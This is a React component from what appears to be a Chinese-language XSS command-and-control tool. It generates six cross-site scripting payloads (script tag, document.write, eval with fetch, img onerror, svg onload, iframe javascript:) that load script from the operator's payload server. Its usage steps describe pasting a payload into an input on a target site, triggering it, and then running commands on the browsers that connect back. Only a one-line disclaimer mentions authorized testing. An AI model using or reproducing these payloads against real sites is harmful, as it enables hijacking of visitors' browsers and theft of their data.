import React, { useState } from 'react';
import { Card, Button, Input, Badge } from './ui';
import ApiService from '../services/api';
import './PayloadGenerator.css';

const PayloadGenerator = ({ projectId }) => {
  const [customId, setCustomId] = useState('');
  const [copied, setCopied] = useState('');

  const payloadUrl = ApiService.getPayloadUrl(projectId);

  const generatePayloads = () => {
    const separator = payloadUrl.includes('?') ? '&' : '?';
    const baseUrl = customId 
      ? `${payloadUrl}${separator}id=${encodeURIComponent(customId)}`
      : payloadUrl;

    return {
      script: `<script src="${baseUrl}"></script>`,
      javascript: `document.write('<script src="${baseUrl}"><\\/script>');`,
      eval: `eval(fetch('${baseUrl}').then(r=>r.text()).then(eval));`,
      img: `<img src="x" onerror="var s=document.createElement('script');s.src='${baseUrl}';document.head.appendChild(s);">`,
      svg: `<svg onload="var s=document.createElement('script');s.src='${baseUrl}';document.head.appendChild(s);"></svg>`,
      iframe: `<iframe src="javascript:var s=document.createElement('script');s.src='${baseUrl}';document.head.appendChild(s);"></iframe>`
    };
  };

  const payloads = generatePayloads();

  const copyToClipboard = async (text, type) => {
    try {
      // 优先使用现代的 Clipboard API
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(text);
      } else {
        // 降级方案：使用传统的 execCommand
        const textArea = document.createElement('textarea');
        textArea.value = text;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        
        const successful = document.execCommand('copy');
        document.body.removeChild(textArea);
        
        if (!successful) {
          throw new Error('execCommand failed');
        }
      }
      
      setCopied(type);
      setTimeout(() => setCopied(''), 2000);
    } catch (error) {
      console.error('复制失败:', error);
      
      // 最后的降级方案：提示用户手动复制
      const userAgent = navigator.userAgent.toLowerCase();
      const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
      
      if (isMobile) {
        // 移动端：选中文本
        const range = document.createRange();
        const selection = window.getSelection();
        const textElement = document.getElementById(`payload-${type}`);
        if (textElement) {
          range.selectNodeContents(textElement);
          selection.removeAllRanges();
          selection.addRange(range);
        }
        alert('已选中文本，请手动复制（Ctrl+C 或 Cmd+C）');
      } else {
        // 桌面端：显示文本让用户手动复制
        prompt('复制失败，请手动复制以下内容:', text);
      }
    }
  };

  const payloadTypes = [
    {
      key: 'script',
      title: 'Script 标签注入',
      description: '最常用的载荷注入方式',
      badge: 'primary'
    },
    {
      key: 'javascript',
      title: 'JavaScript 动态载入',
      description: '通过 document.write 载入',
      badge: 'info'
    },
    {
      key: 'eval',
      title: 'Eval 执行',
      description: '通过 eval 和 fetch 执行',
      badge: 'warning'
    },
    {
      key: 'img',
      title: 'Image 标签利用',
      description: '利用 img 标签的 onerror 事件',
      badge: 'success'
    },
    {
      key: 'svg',
      title: 'SVG 标签利用',
      description: '利用 svg 标签的 onload 事件',
      badge: 'secondary'
    },
    {
      key: 'iframe',
      title: 'IFrame 利用',
      description: '通过 iframe 的 javascript: 协议',
      badge: 'danger'
    }
  ];

  return (
    <Card title="载荷生成器" className="payload-generator">
      <div className="payload-generator__config">
        <Input
          label="自定义客户端ID（可选）"
          value={customId}
          onChange={(e) => setCustomId(e.target.value)}
          placeholder="留空将自动生成唯一ID"
        />
        
        <div className="payload-generator__server-info">
          <div className="payload-generator__server-label">载荷服务器:</div>
          <div className="payload-generator__server-url">{payloadUrl}</div>
        </div>
      </div>

      <div className="payload-generator__payloads">
        {payloadTypes.map((type) => (
          <div key={type.key} className="payload-item">
            <div className="payload-item__header">
              <div className="payload-item__info">
                <h4 className="payload-item__title">{type.title}</h4>
                <p className="payload-item__description">{type.description}</p>
              </div>
              <div className="payload-item__actions">
                <Badge variant={type.badge} size="sm">
                  {type.title.split(' ')[0]}
                </Badge>
                <Button
                  variant="secondary"
                  size="sm"
                  onClick={() => copyToClipboard(payloads[type.key], type.key)}
                >
                  {copied === type.key ? '已复制!' : '复制'}
                </Button>
              </div>
            </div>
            
            <div className="payload-item__code">
              <pre className="payload-item__code-content" id={`payload-${type.key}`}>
                {payloads[type.key]}
              </pre>
            </div>
          </div>
        ))}
      </div>

      <div className="payload-generator__usage">
        <h4 className="payload-generator__usage-title">使用说明</h4>
        <div className="payload-generator__usage-content">
          <ol className="payload-generator__usage-list">
            <li>选择合适的载荷类型复制到剪贴板</li>
            <li>在目标网站的输入框中粘贴载荷</li>
            <li>触发XSS执行（提交表单、刷新页面等）</li>
            <li>返回控制台查看连接的客户端</li>
            <li>对连接的客户端执行各种命令</li>
          </ol>
          
          <div className="payload-generator__warning">
            <strong>⚠️ 安全警告:</strong>
            <p>此工具仅用于授权安全测试。请确保您有权限测试目标系统，并遵守相关法律法规。</p>
          </div>
        </div>
      </div>
    </Card>
  );
};

export default PayloadGenerator;